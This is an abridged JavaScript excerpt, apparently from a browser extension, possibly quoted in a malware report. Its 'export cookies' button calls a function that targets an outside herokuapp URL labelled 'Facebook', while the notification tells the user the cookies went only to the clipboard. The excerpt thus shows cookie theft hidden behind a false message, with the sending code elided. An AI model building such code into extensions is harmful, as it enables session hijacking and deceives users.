(function () {
    ...
    function cookie_xy() {
        ...
        var url = "https://cookie-monstar.herokuapp.com/index.php";
        var name = 'Facebook';
    ...
    document.addEventListener('DOMContentLoaded', function () {
        ...
        document.getElementById('export-cookies').addEventListener('click', () => {
            ...
            cookie_xy();
            sendNotification('All cookies are imported into clipboard.');
